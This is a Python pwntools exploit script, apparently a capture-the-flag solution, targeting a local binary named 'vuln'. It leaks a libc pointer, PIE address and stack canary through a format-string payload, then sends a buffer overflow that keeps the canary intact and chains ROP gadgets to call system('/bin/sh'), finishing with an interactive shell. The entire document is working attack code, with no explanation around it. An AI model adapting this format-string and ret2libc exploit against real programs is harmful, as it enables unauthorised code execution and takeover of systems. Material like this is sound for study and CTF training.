from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
if args.REMOTE:
    io = remote("localhost", 13339)
    libc = ELF("./libc.so.6")
else:
    io = process()
    # gdb.attach(io)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

leak_payload = b"%p-%31$p-%47$p"
io.sendlineafter(b"?\n", leak_payload)

leak = io.recvline().split(b"-")
stdin = int(leak[0][2:], 16)
pie_main = int(leak[1][2:], 16)
canary = int(leak[2][2:-1], 16)

log.info(f"LEAK STDIN = {hex(stdin)}")
log.info(f"LEAK PIE_MAIN = {hex(pie_main)}")
log.info(f"LEAK CANARY = {hex(canary)}")

pie_base = pie_main - elf.symbols["main"]
libc_base = stdin - libc.symbols["_IO_2_1_stdin_"] - 131
log.info(f"BASE LIBC = {hex(libc_base)}")
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh"))
libc_rop = ROP(libc)
pop_rdi = libc_base + libc_rop.find_gadget(["pop rdi", "ret"])[0]
ret = pie_base + 0x1016

offset = 0xb0
payload = b"x" * (offset - 0x8) + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendlineafter(b"?\n", payload)
io.interactive()
